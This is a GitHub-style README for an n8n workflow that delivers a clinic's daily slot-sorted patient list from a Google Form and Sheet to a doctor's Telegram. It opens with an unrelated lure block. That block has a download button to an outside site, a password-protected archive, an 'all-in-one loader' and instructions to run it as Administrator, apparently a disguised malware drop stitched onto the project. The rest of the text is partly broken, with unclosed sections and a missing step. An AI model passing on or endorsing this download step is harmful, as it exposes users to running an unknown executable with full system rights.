<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

# 🩺 Doctor Daily Patient List

### Appointment automation that delivers today's patients to the doctor's Telegram, every morning at 8:30 AM

<p>
## 📌 Overview

A doctor's clinic was handling appointment requests over WhatsApp and tracking patients by hand. Every morning meant scrolling through chats and working out who was booked, for which slot, and on which number.

This project replaces that routine with a small, reliable pipeline:

> **Google Form** → **Google Sheet** → **n8n** → **Telegram**

The clinic assistant only shares a booking form link. From that point on, everything is automatic, and the doctor receives a clean, slot-sorted list of **today's patients at 8:30 AM IST** without opening a single chat.

### ✨ At a glance

| | |
|---|---|
| **Trigger** | Daily schedule, 08:30 AM (Asia/Kolkata) |
| **Input** | Google Form responses stored in Google Sheets |
| **Processing** | Filter by today's date, map to slots, sort, format |
| **Output** | One formatted Telegram message to the doctor |
| **Manual effort** | Only sharing the form link with a patient |
| **Hosting** | Self-managed n8n server with HTTPS, running 24/7 |

---

## 🎯 Problem and Solution

<table>
<tr>
<th width="50%">❌ Before</th>
<th width="50%">✅ After</th>
</tr>
<tr>
<td>

- Bookings scattered across WhatsApp chats
- Doctor scrolls messages every morning
- Names, slots, and numbers noted manually
- Easy to miss or mix up a patient
- Time taken away from patient care

</td>
<td>

- Bookings captured in one Google Sheet
- List arrives on Telegram automatically
- Patients sorted by time slot
- Accurate and consistent every day
- Zero manual tracking

</td>
</tr>
</table>

> 💡 **Design choice:** Calendar-based approaches assume patients and clinic staff already work with calendar invites. A form-and-sheet flow is simpler for everyone, so the booking step stays familiar while the daily tracking becomes fully automated.

---

<a id="architecture"></a>

## 🏗 Architecture

<p align="center">
## ⚙️ The n8n Workflow

<p align="center">
### 🕘 Slot mapping

The `Edit Fields` node converts the slot text from the form into a short label and a sort order.

| Slot text contains | Label | Sort order |
|---|---|:-:|
| `9 AM` | Slot I | 1 |
| `2 PM` | Slot II | 2 |
| `6 PM` | Slot III | 3 |
| anything else | original text | 4 |

> Different clinic timings? Edit the slot conditions inside the `Edit Fields` node.

---

<a id="output"></a>

## 📱 The Output

<table>
<tr>
<td width="55%" valign="top">

### What the doctor receives

Every morning at 8:30 AM:

```text
Today's Patients

1. Sam - Slot I - 87654xxxxx
2. David - Slot II - 65432xxxxx
3. Jennifer - Slot II - 70011xxxxx
4. Max - Slot III - 99887xxxxx

This message was sent automatically
with n8n
```

- Sorted by slot, so the day's order is clear at a glance
- Name, slot, and contact number in one line
- No app switching, no searching

<sub>Names and numbers shown here are dummy data.</sub>

</td>
<td width="45%" align="center">

## 🧰 Tech Stack

| Layer | Tool |
|---|---|
| Automation engine | **n8n** (self-hosted, HTTPS, 24/7) |
| Data collection | **Google Forms** |
| Data storage | **Google Sheets** |
| Notification | **Telegram Bot API** |
| Logic | **JavaScript** expressions inside n8n |

### 🎓 Skills demonstrated

- Designing an end-to-end automation from a real business problem
- Integrating third-party services (Google Sheets OAuth2, Telegram Bot API)
- Data filtering, transformation, and sorting with JavaScript expressions
- Scheduling and timezone handling
- Self-hosting and securing a service with HTTPS
- Privacy-aware design and clean documentation

---

<a id="setup"></a>

## 🚀 Getting Started

### Prerequisites

- An n8n instance (self-hosted or n8n Cloud)
- A Google account (Forms and Sheets)
- A Telegram account

<details>
<summary><b>Step 1: Create the Google Form</b></summary>

<br>

Add these questions. The column names in the linked sheet must match exactly, because the workflow reads them by name.

| Question / Column | Type |
|---|---|
| Patient Name | Short answer |
| Phone Number | Short answer |
| Age | Short answer |
| Sex | Multiple choice |
| Appointment Date | Date |
| Slot Selection | Multiple choice (for example "9 AM to 12 PM", "2 PM to 5 PM", "6 PM to 9 PM") |
| Payment Screenshot | File upload |

Then open the **Responses** tab and click **Link to Sheets**.

</details>

<details>
<summary><b>Step 2: Create the Telegram bot</b></summary>

<br>

### ⚙️ Configuration reference

| Setting | Where | Default |
|---|---|---|
| Run time | Schedule Trigger | 08:30 |
| Timezone | Workflow settings | Asia/Kolkata |
| Date format expected | Filter node | `M/D/YYYY` |
| Slot labels | Edit Fields node | Slot I / II / III |
| Recipient | Telegram node | `YOUR_TELEGRAM_CHAT_ID` |

---

<a id="roadmap"></a>

## 🧭 Limitations & Roadmap

**Current limitations**

- The date filter compares text, so `Appointment Date` in the sheet must be in `M/D/YYYY` format.
- On days with no appointments the workflow sends nothing, so "no patients" looks the same as "workflow failed".
- The Google Form link is still shared manually by the assistant.

**Roadmap**

- [ ] Send a "No appointments today" message when the list is empty
- [ ] Make the date comparison independent of format
- [ ] Add an error-notification workflow for failed runs
- [ ] Send patients an automatic booking confirmation
- [ ] Support multiple doctors or clinics

---

## 📁 Project Structure

```text
doctor-patient-reminder-n8n/
├── README.md
├── LICENSE
├── .gitignore
├── workflow/
│   └── doctor-patient-reminder.json     # importable n8n workflow (sanitised)
├── docs/
│   └── Doctor_Automation_Case_Study.pdf # one-page case study
└── screenshots/
    ├── 01-manual-vs-automated.png
    ├── 02-architecture.png
    ├── 03-n8n-workflow.png
    └── 04-telegram-output.jpeg
```

---

## 🔒 Privacy & Security

- The exported workflow contains **no credentials, tokens, real Sheet IDs, or chat IDs**. Identifiers are replaced with `YOUR_...` placeholders.
- All screenshots and sample outputs use **dummy names and masked numbers**.
- The form collects personal data (name, phone, age, payment proof). Restrict access to the Google Sheet and Drive folder, and share the bot chat only with the intended doctor.

---

## 👨‍💻 Author

<table>
<tr>
<td>

**Mayank Srivastava**<br>
B.Tech in Computer Science (Data Science)<br>
Automation • Data • AI/ML

</td>
<td>
